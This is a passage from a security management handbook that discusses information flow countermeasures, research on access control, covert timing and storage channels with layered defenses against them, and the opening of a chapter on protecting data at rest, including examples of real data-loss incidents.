can view least privilege as a more granular implementation of separation of 
duties. For instance, suppose two individuals have the same duties. This does 
not mean that both individuals should have equal access to all of the informa-
tion associated with their function. If both individuals maintain records on 
different subordinates, then one should not have access to the information of 
the other. Implementing least privilege prevents a breach of confidentiality 
that might be associated with a subordinate’s performance evaluation. Viewing 
least privilege as a subset of separation of duties provides us with the implica-
tion that the former is subject to the same impacts as the latter.
Least functionality: Ideally, a system cannot be used to take actions that are 
◾
◾
not intended. For instance, an ordinary user is not provided access to utilities 
allowing the circumvention of business logic or security controls. Likewise, 
the system should prevent escalation of functionality. The installation or exe-
cution of unauthorized applications increases functionality beyond what was 
intended for the system or user. Implementing least functionality substan-
tially impacts the logical realms of CIA, because unauthorized applications 
can be used to disrupt any of these security services.
Logical access control: This countermeasure is the technical basis for logical 
◾
◾
security within a system. Although it has been previously noted that the pre-
dominant access control mechanism has some serious issues, it is nonetheless 
the fundamental means to secure information flows. Properly implemented 
access control can prevent unauthorized access, tampering, and attacks 
against availability. However, implementations are tricky and not perfect. 
Indeed, logical access control is the main security countermeasure used to 
protect logical information flows. As the basis for the three security services, 
it clearly provides a direct impact on information flow security.
Encryption: This countermeasure has a high rate of usage to protect informa-
◾
◾
tion flow confidentiality. Encrypting an information flow with a good algo-
rithm can provide a strong countermeasure against confidentiality attacks 
from both the logical and physical realms. This is predicated on a good key 

268  ◾  Information Security Management Handbook
management strategy that guards against the unauthorized disclosure of the 
secret used to protect the information. Some encryption algorithms and pro-
tocols can also be used to detect unauthorized changes to information flows. 
Providing integrity assurance is a little more involved, but not always imple-
mented in conjunction with every type of encryption. Thus, encryption is 
a substantive technique used to protect the confidentiality of information 
flows. It can also provide some integrity assurances as well. Encryption usage 
crosses both realms due to the nature of the implementation.
Audit: Accountability is primarily achieved through the use of audit mecha-
◾
◾
nisms. Auditing is an important countermeasure, but it has two significant 
disadvantages. First, it is a reactive security control. By the time an event is 
logged, the damage may already be done. Second, it usually requires an inves-
tigation by a security analyst. These two factors diminish the immediacy of 
the countermeasure, relegating it as one that provides an indirect impact on 
the logical aspects of a system.
Backup: The primary method of assuring availability is through backups. 
◾
◾
Redundancy is a cousin of backups, but not the same. A properly implemented 
backup, whether in system components or images of system data, provides 
the necessary assurance that restoration from a prior point in time can occur. 
Logical backups can also be used to validate file integrity or replace corrupted 
files. However, this is not the normal use for backups, and currently can only 
be considered providing an indirect impact on logical integrity. Indeed, back-
ups are a substantive control that can be used to protect physical and logical 
availability.
Security control testing: This is a process of validating that the counter-
◾
◾
measures implemented appropriately support the security requirements 
and are operating as intended. Security control testing involves manual 
and automated processes, which can be used to identify any countermea-
sure weaknesses. This type of countermeasure has its limitations. First, it is 
very human-resource intensive. A security expert must evaluate physical and 
logical controls on the system. This involves interviews, observations, docu-
ment reviews, and technical testing. Due to the depth and breadth required 
for comprehensive testing of a system, this countermeasure is not frequently 
used. The periodic nature of security testing is the second limitation for this 
control. Due to these limitations, it is understandable that this control would 
only have a limited impact on information flows over a long period of time.
Vulnerability scanning: Systems often contain weaknesses that arise from 
◾
◾
improper configurations, weak policies, and flawed software. These weak-
nesses are identified through manual reviews or automated scanning tech-
niques. This type of activity is essential to assure information security. 
However, there are two aspects, when considered, which reduce the impact 
of this countermeasure. First, scanning is periodic. Unless the period of scan-
ning is very short, it is possible for a weakness to exist long enough for a threat 

Information Flow and Covert Channels  ◾  269
to exploit it. The second reason is that scanning is a passive security control. 
An identified weakness usually requires human intervention to correct the 
problem. This might take more time, given the situation, which could be 
detrimental to ongoing operations of the system. Thus, this necessary coun-
termeasure over a long period of time has an indirect impact on information 
flow security in the logical realm.
Integrity monitoring: Tools used to detect unauthorized configurations and 
◾
◾
binary files protect system integrity. Arguably, integrity is the most important 
security service. Without integrity, it is difficult to know if confidentiality 
measures are not being bypassed. Similarly, availability will be constantly at 
risk if the integrity weakness or violation impacts the operating system itself. 
Integrity monitoring software that regularly checks for unauthorized changes 
in files and configurations have a substantive impact on the integrity service. 
If we accept that integrity is necessary to have confidentiality and availability 
assurances, then we can conclude that integrity monitoring has at least a 
minimal impact on the other services as well.
System intrusion detection: The implementation of this countermeasure par-
◾
◾
allels its counterpart in the physical realm. Its purpose is to identify actual 
attacks. The unfortunate difference between facility and system intrusion 
detection is that the latter can be plagued by high false-alarm rates. Intrusion 
detection systems have been known to generate an enormous volume of false 
alarms, which must be waded through by a security practitioner. Another 
shortcoming of intrusion detection is that it is a passive security control, 
which requires the response of a human to correct the problem. The most 
effective implementation of this countermeasure requires a human analyst 
constantly to analyze and investigate alarms. These actions can take time, 
which reduces the value of the tool when a high number of false alarms is 
experienced. Thus, this countermeasure is considered to provide an indirect 
impact on the security of information flows due to its reliance on a human 
resource, which may not be able to react quickly enough to actual events.
Malicious code monitoring: Detecting and countering malicious code is a 
◾
◾
critical part of an overall security program. Without this countermeasure, 
it would be difficult to protect systems from known malicious code such 
as worms, viruses, Trojan horses, keystroke loggers, and devious spyware. 
Indeed, most malicious code monitoring tools, such as anti-virus software, 
continuously scan a system to identify any processes that might be malicious. 
As such, this countermeasure has a direct impact on the security of infor-
mation flows. When malicious code is detected, it essentially indicates that 
unauthorized software is executing or stored on the system. At its most basic 
level, this involves the integrity security service. In this sense, malicious code 
monitoring is quite similar to the integrity monitoring countermeasure. We 
can, therefore, assign the same impact levels to this countermeasure as that 
of integrity monitoring.

270  ◾  Information Security Management Handbook
20.10  Emerging and Potential Techniques
The academic community regularly provides novel and clever techniques that can 
be used to secure information flows. Security practitioners, system managers, and 
product developers are encouraged to review regularly peer-reviewed literature, 
such as journals and academic-focused magazines, to learn about emerging tech-
niques that might be useful.
Researchers and product vendors continue to explore new ideas, methods, and 
techniques to secure information flows. Most research related to information flow 
countermeasures falls into the category of access control. As previously mentioned, 
access control is one of the best general techniques that can be leveraged to con-
trol information flow. The predominant areas involving access control research are 
file systems and databases. File systems are generally protected by an access con-
trol system such as DAC, but limitations are quickly encountered when coupled 
with new technology concepts such as peer-to-peer file sharing (Tran et al. 2005) 
and coalition environments (Phillips, Ting, and Demurjian 2002). Access control 
within databases becomes challenging when considerations are given to new types 
of access and usage. Bertino and Sandhu (2005) point out that securing databases 
is more difficult when consideration is given to intellectual property rights, mobile 
users, and database survivability. As new access methods and social issues emerge, 
access control techniques may need to evolve to accommodate new challenges. 
Some of the existing access control mechanisms, such as DAC, need improvement 
to keep up with rapid changes in technology.
One of the shortcomings of current implementations of DAC is that all files 
accessible by a user can be accessed through any application running in the user 
context. For instance, within Microsoft Windows, one can easily open any file 
with Word Pad or Notepad. Although the contents may not be coherently dis-
played, both applications can be used to view the contents. Suppose now that for 
any given file type, DAC only allowed the appropriately associated application to 
open the file. This would enable a new dimension of access control, which associates 
file types with approved applications. Such a mechanism is reported by Schmid, 
Hill, and Ghosh (2002). Their implementation, called FileMonster, executes at the 
device-driver level, intercepting requests to open files. FileMonster checks requests 
against an access list to determine which files and what level of access are permitted 
for the requesting application. Because FileMonster is running at the system level 
through the device driver, it can be considered a part of the access control mecha-
nism of the system.
Trusted Platform Module (TPM) is an emerging hardware technology that is 
designed to enhance system trust. This technology relies on a protected module that 
provides trusted cryptographic operations. Thus, data submitted to the module can 
be encrypted or digitally signed with its embedded cryptographic certificate. The 
signature can be remotely validated or attested, proving the integrity and validity of 
the message. Because the TPM is in the hardware, it cannot be easily circumvented 

Information Flow and Covert Channels  ◾  271
by software. This improves the amount of trust that is given to a system. Sailer et 
al. (2004) designed and implemented a TPM-based system, which allowed attesta-
tion of remote systems. In their implementation, the TPM was used to validate 
the integrity of executing software and system configurations for a client remotely 
accessing a corporate network, and they had two security design goals in mind. 
First, they wanted to prevent external attackers from bypassing the corporate fire-
wall through a compromised remote host. This can be accomplished through the 
compromise of an external host with a Trojan that uses the client’s VPN connection 
to gain access to the protected corporate network. The second goal was to prevent 
accidental or intentional leakage of information flows from the corporate network 
to the remote client. The first goal was achieved by validating processes executing 
on the external host. If any unauthorized or compromised processes are discovered, 
the VPN terminates or prevents the connection of the remote client. Meeting the 
second goal required the remote user to process all corporate interactions through 
a RAM disk as the primary area for file interaction. The user is prevented from 
saving information processed on the RAM disk to local or external media. The sys-
tem clears the RAM disk on shutdown or disconnection from the corporate VPN. 
The implementation exhibited by these researchers demonstrates the usefulness of 
a TPM to control information flows.
An organization’s word processing files can store copious amounts of sensitive 
information. Preventing inappropriate information flows into or out of these files 
is a difficult challenge. One team of researchers reported on their solution, which 
prevents the unauthorized leakage of information from protected files. The solu-
tion developed by Yu and Chiueh (2004) called display-only file server (DOFS) is 
designed to prevent information theft by insiders authorized access to the informa-
tion. Their technique requires a protected file to be checked-in to the DOFS. Access 
to protected files is mediated through Windows Terminal Service and their own 
device drivers, which coordinate access and updates of the files. Windows Terminal 
Service provides the primary user interaction with the documents. A protected doc-
ument is available on the client machine through the client session with Windows 
Terminal Service. A device driver on the server mediates requests and enforces 
access control. The device driver on the client machine facilitates clipboard actions 
from the client to the server, presents screenshots of the display, and even enables 
offline interaction with a protected file. The solution by authors Yu and Chiueh 
provides a virtual wall between the user and the data that disrupts unauthorized or 
unintended information flows.
Applications cause information flows when they open and write to files, i.e., 
information flows from the file to the application and vice versa, respective of open 
and write actions. When we consider information flows, it is quite usual that we 
expect programs to interact with particular file types. For instance, word processors 
are normally used to open files with a “.doc” extension. Similarly, Web browsers 
normally interact with hypertext files. We would not expect to observe a calcula-
tor program opening a word processing file. We anticipate that programs will only 

272  ◾  Information Security Management Handbook
interact with file types for which they were designed. The work by Nguyen, Reiher, 
and Kuenning (2003) sought to determine if applications typically access a limited 
number of file types. In their research, they monitored file system calls of applica-
tions on a production system over a three-week period and found this to be true 
in 92 percent of their test cases. They concluded that most applications typically 
interact with a particular list of file types associated with the program. Accessing 
file types outside of the list may be considered anomalous and brings into question 
the actions of the end user of the program or the integrity of the application. With 
respect to application integrity, this supports the notion that a buffer-overflow attack 
is detectable when the application is forced to access files that it typically does not 
that. Price (2006) suggests that periodic validation of process executables and librar-
ies could be used to detect changes in program integrity. The work by the aforemen-
tioned authors demonstrates the possibility of using information flows as a means 
to detect intrusions. Monitoring system call activity associated with information 
flows between applications and particular file types may provide a means to improve 
intrusion detection. We could use knowledge of information flows to reduce false 
alarms. Suppose a host-based intrusion detection system thinks it views an attack 
by a particular application. If we know that the file type accessed is typical, then we 
may be able to conclude that the alarm is a false positive. Now let us assume that no 
alarm is generated, but we observe an application accessing a file type that it should 
not access. One example could be our calculator program creating a new executable 
on the file system. This is certainly abnormal behavior that should be identified. If 
we know that this type of activity is not normal, then we could use this observation 
of the information flow as a way to improve intrusion detection.
Information theft by insiders is a concern. We may consider information theft 
as an information flow that “ex-filtrates” information from one file to another. One 
example of this could be an insider copying sensitive information from within a 
word processing document into the body of an e-mail and sending it to an unau-
thorized individual. Another simple example is where an insider makes a copy of 
a file to external media. Identifying these unauthorized information flows might 
require two important controls. First, we must know what information or files 
should not be communicated outside of a particular boundary. Second, we would 
need to be able to detect when the information flow is occurring. Let’s assume 
that the boundary is a particular directory on the system, which we will refer to 
as the protected repository. Our policy states that users are not to copy informa-
tion within the protected repository into any other files or interfaces outside of the 
directory. How then could we detect when the policy is violated? We would need 
to observe information flows from users accessing files within the repository. Our 
observation would compare flows from the user to the information contained in the 
protected repository. If the information is in cleartext, then we could rely on plagia-
rism techniques to identify unauthorized flows. Gruner and Naven (2005) describe 
a tool they designed to detect plagiarism in text-based documents. Their approach 
uses a statistical approach that determines authorship of textual information. 

Information Flow and Covert Channels  ◾  273
Using plagiarism detection techniques as a means to identify unauthorized infor-
mation flows is not common in the literature and is most likely a novel approach 
to the insider threat problem. Dirty word searches are a more simplistic approach 
to detecting information flows. This approach attempts to identify key words or 
phrases that are not allowed in the information flow. The disadvantage with this 
approach is that a rephrasing of the content would not likely be detected by a dirty 
word filter. However, plagiarism detection techniques have been shown capable of 
identifying content rephrasing (Clough et al. 2002).
20.11  Covert Channels
Information may become corrupted, lost, or even stolen. The advances of IT have 
taken remarkable care to alleviate the first problem. The use of cyclic redundancy 
checks and hashing help identify and recover corrupted information in each of 
the three information states. We depended on logical and physical redundancy to 
recoup information that is lost. Backups and RAID technology have enabled orga-
nizations to survive system losses and continue their operations. However, the dif-
ficult problem to solve involves the theft of information. The advances in IT have 
created the means for vast quantities of information to be removed from systems 
surreptitiously.
As previously mentioned, any movement of information is considered an infor-
mation flow. We now will designate each discrete flow of information to be known 
as a channel. Consider a word processing document that is derived from multiple 
sources. We can imagine that this document exemplifies a channel from each of 
the original sources. If our fictitious document is a compilation of information 
taken from an internal Website, spreadsheet, and another document, then it could 
be said that it contains at least three channels. Suppose now that the creator of the 
document also includes other text of a sensitive nature that is not supposed to be 
included within it. The insider does not want simply to copy and paste the informa-
tion into the body of the document, as this would be an obvious disclosure. There 
are numerous ways the information could be included and yet missed by others. 
For instance, the insider could put the information into the header or footer of the 
document and change font color to white. Another method might involve slightly 
changing the font size of characters throughout the document to reveal the mes-
sage. The point is that a casual observer might not immediately see the message 
hidden in plain sight. Such transfers of information are considered covert channels, 
whether by design or accident.
A covert channel involves the intended or unintended transfer of information 
contrary to a security policy. The two predominant means by which information 
is transferred covertly involves timing or storage techniques. Covert timing chan-
nels occur when one process transfers information by modulating system resources 
such as CPU cycles, file locks, or network connection events. A secondary process 

274  ◾  Information Security Management Handbook
observes the resource usage to obtain the information conveyed by the modulation. 
Covert storage channels involve direct or indirect reading or writing to storage 
locations such as disk files, hard-copy reports, database records, or network packets. 
The information is observed by a secondary process (or person) that reads the data 
(or lack thereof) at the storage location. We will primarily focus our discussion on 
covert storage channels, as these are the most likely to be encountered.
A covert channel is unintended when the movement of information includes 
other information that was accidentally or unknowingly included. Unintended 
covert channels occur on a regular basis. Perhaps the most notorious of these are 
documents from office productivity software. Some software retain their edits in 
the original file. New files might be created from templates that contain past edit-
ing information. It is possible that some of these edits may be of a sensitive nature 
and should not be released by the organization. Another unintended covert channel 
discovered involved the modulation of optical emanations from equipment LED 
status indicators. Loughry and Umphress (2002) discovered a correlation between 
data processed and the modulation of LED indicators on some devices. By observ-
ing the modulation of the LED, an attacker could obtain access to cleartext mes-
sages processed by the device.
Mitigating unintended covert channels requires knowledge of the technology in 
use. Security practitioners must consider the possibilities of covert channels when 
new technologies emerge. Similarly, it is ideal if a practitioner occasionally reviews 
existing technologies and considers ways that information might be unintention-
ally flowing out of the organization.
20.11.1  Attacks
The most serious threat arises from an intentional covert channel. Attackers who 
desire to pass information through the use of covert channels are only limited by 
their imagination. An ideally contrived covert channel will encode a message with 
very little entropy. This means that the information is abstracted well enough not to 
be obvious, but simplistic enough that it can easily be extracted from the channel. 
The information in the covert channel should blend in with the other information 
such that it does not draw attention to itself. For instance, including encrypted 
information within a plaintext file is not an ideal, as the ciphertext would stand 
out. However, placing encrypted text within a binary file, such as an Adobe PDF 
file, would be less conspicuous. An attacker seeking to transfer information covertly 
would like to do so through automated techniques. This might be conducted in one 
of the following ways:
Program output: The output of an application could have covert mechanisms 
◾
◾
built-in to modify or redirect messages. The application might redirect infor-
mation flows by creating files of generated reports on another part of the 
system. Another alternative may occur when the programmer uses standard 

Information Flow and Covert Channels  ◾  275
reporting features to communicate other information. A report output might 
contain extra information through text formatting or text insertion to con-
vey the covert channel. Any application output, which can be manipulated, 
contains the seeds for a covert channel.
Web content: Hypertext pages and associated content could provide a way to 
◾
◾
send information surreptitiously to an external entity. Dynamic pages pro-
vide one method to communicate information under the radar. Modification 
of server-side scripts or exploitation of back-end databases could allow an 
attacker periodically to retrieve or send information externally. Changes to 
static Web pages may also be conducted by an insider such that the informa-
tion can be observed externally.
Steganography: This is the art of hiding information inside other information. 
◾
◾
Perhaps the most well-known example of this technique involves the conceal-
ment of messages inside a digital image. This is possible due to inexactness 
of hues and colors within an image. This provides ample opportunity for an 
attacker to record a message by simply changing values within the image by a 
bit or two. Often, the changes to the image are not visually apparent.
Encryption: Information flows can be protected through a variety of encryp-
◾
◾
tion techniques. Likewise, information can be secretly transferred out of a 
protected enclave using the same mechanisms. Whether file or communica-
tion encryption is used, it is difficult to determine what information might 
have exited a system. An attacker may desire to mimic ordinary activity 
through the use of SSL connections with remote sites as a means to “ex-
filtrate” the target information.
Collaboration software: Chat and peer-to-peer applications are common 
◾
◾
methods used to remove information from a system surreptitiously. The per-
vasiveness of these tools and their potential for abuse creates an ideal avenue 
for a covert channel. Rogue processes, such as those associated with botnets, 
commonly use chat services for command and control. Similarly, an attacker 
could use these same ports and services to transfer information covertly out 
of a system.
20.11.2  Observable Properties
The information flow associated with a covert channel contains several properties 
worth considering, which can help identity potential or actual occurrences. If we 
consider the purpose driving covert channels and the ways in which they might be 
conducted, then we can begin to identify their existence through the properties 
of a contrived channel. Although this line of thought most closely aligns with an 
intended covert channel, it could also serve to help identify those that are unin-
tended. A covert channel contains properties that define the instance and action of 
the channel. The following list describes the properties of method, mode, encoding, 
and accessibility:

276  ◾  Information Security Management Handbook
Method: The means to transfer information covertly is either an interactive or 
◾
◾
proxy activity. An attacker with direct access to the target information may 
desire to interact directly with the information and initiate the covert chan-
nel. When direct access is not possible or undesirable, attackers will choose 
a proxy to establish the covert channel on their behalf. This is most likely 
accomplished through the use of a Trojan horse or other type of spyware.
Mode: A covert channel is either active or passive. An active covert channel 
◾
◾
integrates with a target process to capture target information as it becomes 
available. An active covert channel could send information as collected or 
based on a predetermined periodic basis. Passive mode is one in which the 
covert channel only collects the target information upon request. Thus, it 
tends to occur in nonrepetitive periodic intervals and relies upon some form 
of manual intervention to initiate the covert channel.
Encoding: Information flows transiting a covert channel require some form 
◾
◾
of encoding. It is possible that the attacker will make no attempt to conceal 
what is being sent. In other cases, a variety of techniques could be deployed to 
hide what is being sent. We consider attempts made to conceal the informa-
tion in the covert channel as obfuscation encoding. Obfuscation could take 
on many forms from a simplistic approach of hiding information in plain 
sight to the use of complex cryptographic algorithms. Obfuscation is identifi-
able by the fact that the information is only learned when the key to obtain-
ing the information is known. The key is simply any process used to reveal the 
hidden message. Processes could be changing font colors or styles, observing 
the first letter of the first 100 words, or as complex as a cryptographic key to 
extract the information from an apparent randomized set of characters.
Accessibility: For a covert channel to be effective, the attacker must be able to 
◾◾
obtain the information flow of the channel. Thus, the destination of a channel 
becomes a factor of the covert channel’s properties. Generally, the endpoint of 
the channel will either terminate inside or outside of the target organization’s 
system. The attacker must be able to access the information directly or indirectly. 
Internal destinations may be more difficult to identify if the activity is normal 
for the endpoint. Write actions within a system will need to be scrutinized to 
identify possible accessibility for a covert channel. External destinations are eas-
ier to observe. Indeed, this may also present problems when the destination is 
similar to normal activity, such as communication with an external Website.
20.11.3  Defenses
An effective defense against covert channels will most likely require a layering of 
countermeasures. When we consider the multiple permutations of the observable 
properties, it becomes evident that no one defense will suffice. Therefore, we should 
select countermeasures that disrupt the method, mode, encoding, and accessibility 

Information Flow and Covert Channels  ◾  277
properties of a covert channel. The following list describes some countermeasures 
and their possible uses to defend against covert channels:
Segregation: In the form of separation of duties and restrictive information 
◾
◾
flows, segregation can interfere with the mode and accessibility of a targeted 
information flow. Preventing developers from accessing production systems 
is one process that should be followed. Likewise, ordinary users should be 
prevented from physically accessing critical system components, which might 
be used to divert information flows.
Software and system integrity: Checks and balances of in-house and installed 
◾
◾
commercial software should be conducted on a regular basis. A software 
librarian acting as the guardian for the installed software serves as the stan-
dard by which all executable binaries should be compared. Users should be 
prevented from altering software on the system. Furthermore, the system 
should be designed with multiple control layers to prevent the execution of 
unauthorized software.
Digital signatures: Implementation of nonrepudiation techniques will 
◾
◾
strengthen message validity and integrity. This can help identify or prevent 
covert insertion of items into authorized files and messages.
Encryption: As previously mentioned, encryption provides a means to vali-
◾
◾
date message integrity. Tampering with information flows protected with 
encryption can become obvious when the decryption fails or produces unex-
pected output.
Communication disruption: Preventing or obstructing unauthorized com-
◾
◾
munication paths can interrupt the method and accessibility of a covert 
channel. Blocking unauthorized ports or protocols at the host level is ideal. 
Another technique that can thwart a covert channel method is to limit which 
applications can write to media and where they can write to.
Intrusion detection and traffic analysis: Although these are monitoring meth-
◾
◾
ods, they can be used to discover peculiar behavior. These activities are a 
necessary layer used by a skilled analyst to identify information flows that 
are anomalous or unauthorized. Subsequent investigation may reveal actual 
covert channels, malicious code, unauthorized software, compromises, or 
simply unrecognized activity that is authorized.
Least privilege: Limiting what information flows a user or application can 
◾
◾
access will reduce the impact of a compromise. A covert channel with sub-
stantial access can significantly compromise an organization’s sensitive infor-
mation and may put operations in peril. Reducing resource access can also 
help identify a covert channel when it attempts to access information that is 
not authorized. Implementing least privilege may force an attacker to use a 
proxy as the mode property. This provides yet another opportunity to dis-
cover the attack.

278  ◾  Information Security Management Handbook
Least functionality: Reducing system functionality to only that which is 
◾
◾
required will help identify covert channels. When a system has a rich set 
of functionality provided by numerous software packages and services, it is 
easier for a covert channel to hide in the background noise of the activity. 
Restricting what is allowed to execute and communicate can cause a covert 
channel to rise above the background noise and be identified.
Process monitoring: Some covert channels rely on specialized tools to accom-
◾
◾
plish their task. For instance, a tool would most likely need to be used for 
complex encoding such as the use of encryption or steganography. Preventing 
the execution of unauthorized tools on the system is an important step in 
preventing covert channels. When process execution cannot be prevented, at 
least knowing what processes have run will provide some potential to identify 
tools enabling the properties of a covert channel, as well as assign account-
ability on their use.
Auditing: Covert channels may create security events through their activity. 
◾
◾
They might attempt to access restricted resources, which are subsequently 
recorded in an audit log. Successful access to resources outside of normal 
business hours could also indicate suspicious activity. The passive nature of 
event logs does little to prevent covert channels, but they are an important 
countermeasure that can be used to identify them. Indeed, audit events that 
feed into an intrusion prevention system could result in the blocking of covert 
channels as well.
In retrospect, knowing what information is accessed and what subsequent flows 
occur provides an indication of potential transfer paths, which can help identify 
covert channels. Encoding, perhaps the most difficult challenge of this puzzle, 
could be used to thwart analysis. Disrupting the properties of covert channels can 
help establish a defensive posture against this type of attack.
20.12  Summary
Modern IT systems facilitate information flows at many levels. At the micro level, 
data moves between software and hardware components within a single machine. 
Macro-level flows involve information movement between discrete system com-
ponents up to intrasystem transfers of information. Consideration for the secu-
rity services of discrete data movement is necessary to assure that the appropriate 
countermeasures are in place to protect the confidentiality, integrity, and avail-
ability of the information. Securing information flows becomes problematic due 
to their complexities, as well as persistent weaknesses in the predominant access 
control mechanism. Attacks against information flows must be counteracted with 
the appropriate controls. This chapter presented a framework that could be used 
to select the countermeasures needed to secure discrete information flows. The 

Information Flow and Covert Channels  ◾  279
framework proceeds as a logical process that evaluates associated data, subjects, 
information flows, and security services. A secondary process is also specified to 
identify which security services should be selected. This process begins with secu-
rity requirements and proceeds through a risk-based analysis to arrive at the most 
appropriate security services needed for the data flow. Emerging and potential tech-
niques can be used to enhance information flow security. The problem of covert 
channels is difficult to address, whether the attacks are intentional or not. A layered 
defense of countermeasures is needed that will disrupt the method, mode, encod-
ing, and accessibility properties of the covert channel.
References
Bertino, E. and Sandhu, R. 2005. Database security — concepts, approaches, and challenges. 
IEEE Transactions on Dependable and Secure Computing, 21, 2–19.
Bose, R. 2002. A conceptual framework for composing and managing scientific data lineage. 
Proceedings of the 14th International Conference on Scientific and Statistical Database 
Management, 15–19.
Clough, P., Gaizauskas, R., Piao, S.S.L., and Wilks, Y. 2002. METER: MEasuring TExt 
Reuse. Proceedings of the 40th Annual Meeting of the Association for Computational 
Linguistics, 152–159.
Downs, D.D., Rub, J.R., Kung, K.C., and Jordan, C.S. 1985. Issues in discretionary access 
control. Proceedings of the IEEE Symposium on Security and Privacy, 208–218.
Gruner, S. and Naven, S. 2005. Tool support for plagiarism detection in text documents. 
Proceedings of the 2005 ACM Symposium on Applied Computing, 776–781.
Loughry, J. and Umphress, D.A. 2002. Information leakage from optical emanations. ACM 
Transactions on Information and System Security, 53, 262–289.
Maconachy, W.V., Schou, C.D., Ragsdale, D., and Welch, D. 2001. A model for informa-
tion assurance: An integrated approach. Proceedings of the 2001 Information Assurance 
Workshop, 306–310.
Nguyen, N., Reiher, P., and Kuenning, G.H. 2003. Detecting insider threats by monitoring 
system call activity. Proceedings of the 2003 Information Assurance Workshop, 45–52.
Phillips, C.E., Ting, T.C., and Demurjian, S.A. 2005. Information sharing and security in 
dynamic coalitions. Proceedings of the Seventh ACM Symposium on Access Control Models 
and Technologies, 87–96.
Price, S.M. 2006. Secure state processing. Proceedings of the 2006 Information Assurance 
Workshop, 380–381.
Price, S.M. 2007. Supporting resource-constrained collaboration environments. Computer, 
406, 108–107.
Sailer, R., Jaeger, T., Zhang, X., and Van Doorn, L. 2004. Attestation-based policy enforce-
ment for remote access. Proceedings of the 11th ACM Conference on Computer and 
Communication Security, 308–317.
Schmid, M., Hill, F., and Ghosh, A.K. 2002. Protecting data from malicious software. 
Proceedings of the 18th Annual Security Applications Conference, 199–208.
Tran, H., Hitchens, M., Varadharajan, V., and Watters, P. 2005. A trust based access control 
framework for P2P file-sharing systems. Proceedings of the 38th Hawaii International 
Conference on System Sciences, 302–312.

280  ◾  Information Security Management Handbook
Waltz, E. 1998. Information Warfare Principles and Operations. Boston: Artech House.
Yu, Y. and Chiueh, T. 2004. Display-only file server: A solution against information theft due 
to insider attack. Proceedings of the Fourth ACM Workshop on Digital Rights Management, 
31–39.

281
21
Chapter 
Securing Data at Rest: 
From Smart Phones 
to Tapes Defining 
Data at Rest
Samuel Chun and Leopold Kahng
Contents
21.1	 Introduction.............................................................................................282
21.2	 Data at Rest Incidents..............................................................................283
21.3	 Where Does Data at Rest Reside?........................................................... 284
21.3.1	Tokens......................................................................................... 284
21.3.2	Smart Handheld Devices..............................................................285
21.3.3	Endpoints.....................................................................................285
21.3.4	Servers......................................................................................... 286
21.3.5	Enterprise Storage........................................................................ 286
21.3.6	Backup Tapes.............................................................................. 286
21.3.7	Other Media................................................................................ 286
21.4	 Protecting Data at Rest............................................................................287
21.5	 Protective Countermeasures for Data at Rest...........................................287
21.5.1	Technology-Based Countermeasures............................................288
21.5.2	Encryption: The Line in the Sand.................................................288
21.6	 Defense in Depth: Lessons from Stalingrad.............................................290

282  ◾  Information Security Management Handbook
21.1  Introduction
The ever-increasing volume and velocity in which electronic data is being accu-
mulated has led to the rapid development of infrastructure technologies that 
allow for the quick storage and easy access of the stored information. In the 
past, the research and development efforts by technology vendors focused almost 
exclusively on addressing these two challenges: volume by ever-increasing storage 
capacities by advances in the media itself and velocity by innovating enabling 
technologies that allow for quicker access such as iSCSI and Fibrechannel. In 
those efforts, the technology vendors have been extremely successful, and stor-
age infrastructure has been one of the most readily accessible and easy-to-deploy 
platforms in IT.
This success, however, does come with a cost, and it’s not entirely financial. 
The data already accumulated and the increasing rate at which data is being trans-
formed into “soft” form has lead to a new problem: the data “at rest.” There is no 
single canonical definition of data at rest. However, the following statement identi-
fies the key characteristics of data at rest:
Data at rest is information stored on media that is not traversing a net-
work or residing in memory.
This seemingly benign statement refers to almost all electronic content not actively 
in use by an organization. Vulnerabilities in the security infrastructure that pro-
tect data at rest can have enormous consequences to the organizational mission 
as almost everyone has some form of sensitive content that they need to protect 
against inappropriate access, theft, or inadvertent disclosure. Consequently, busi-
nesses, government agencies, and other organizations are becoming increasingly 
concerned about the threats against their data at rest. These threats are unfortu-
nately real, and the following sections will describe some of the incidents that have 
occurred in the not-so-distant past.
21.7	 Case Study: Secure Information Sharing Architecture.............................291
21.7.1	What Is SISA?..............................................................................291
21.7.2	SISA History................................................................................292
21.7.3	SISA Architecture.........................................................................293
21.7.4	Technologies for Defense in Depth...............................................295
21.7.4.1	Endpoint Protection......................................................295
21.7.4.2	Access Protection...........................................................297
21.7.4.3	Content Protection........................................................297
21.7.4.4	Data Protection.............................................................298
21.7.4.5	Adaptive Threat Defense...............................................298
21.7.5	Case Study Summary...................................................................298
21.10	Conclusion...............................................................................................299

Securing Data at Rest  ◾  283
21.2  Data at Rest Incidents
According to privacyrights.org, a site managed by the nonprofit consumer pro-
tection organization Privacy Rights Clearinghouse, there is a data loss incident 
reported nationwide every two days with over 230 million private records lost since 
2005 (the numbers are likely to be much higher because many incidents are not 
reported). These numbers are staggering, with a reported private record loss for 
almost every American. In the vast majority of these reported cases, data was lost at 
rest, as opposed to “on the wire” or “in active use.” Consider the following sampling 
of incidents of loss of data at rest:
The National Institutes of Health: A laptop containing private medical infor-
◾
◾
mation on over 2000 patients in a clinical trial was lost in February 2008. 
The laptop contained seven years of patient data including names, medical 
diagnoses, and patient cardiac images. None of the data was encrypted on the 
laptop, in clear violation of HIPAA privacy regulations.
University of Minnesota Reproductive Medicine Center: A physician at the 
◾
◾
center lost a USB flash drive that contained unencrypted medical treatment 
information on over 3100 patients of the center.
Bank of America: Unencrypted backup tapes containing information from 
◾
◾
over 1.2 million federally issued credit cards were lost. The loss occurred dur-
ing transit of tapes from one Bank of America facility to another. These miss-
ing tapes contained Social Security numbers and other financial information 
on over 900,000 federal workers including U.S. senators.
Jefferson County Public Schools, Arvada CO: A special education technician 
◾
◾
had a personal laptop and jump drive stolen during a home robbery. The 
jump drive may have contained data on more than 2900 special education 
students and their legal guardians.
Idaho State University: A security breach was discovered in a server con-
◾
◾
taining archival information about students, faculty, and staff. The breach 
of this archive server, which contained data almost exclusively at rest, con-
tained names, Social Security numbers, birthdates, and grades of hundreds 
of individuals.
These incidents clearly demonstrate the breadth and scope of the dangers that 
organizations face with their data at rest. There are risks for organizations of all 
types—public/private, small/large, and regulated/nonreal—and real breaches have 
occurred that have already violated the privacy rights of millions of individuals. 
With the rate of accumulation of sensitive data increasing, there is legitimate con-
cern over how to secure this massive amount of data when not in active use. The 
concern is so real that currently both houses of Congress are evaluating amend-
ments to Title 44, United States Code, to strengthen the requirements related to 
security breaches of data involving the disclosure of sensitive personal information. 

284  ◾  Information Security Management Handbook
Senate Bill 1558 and House Resolution 2124 (which are identical), referred to as 
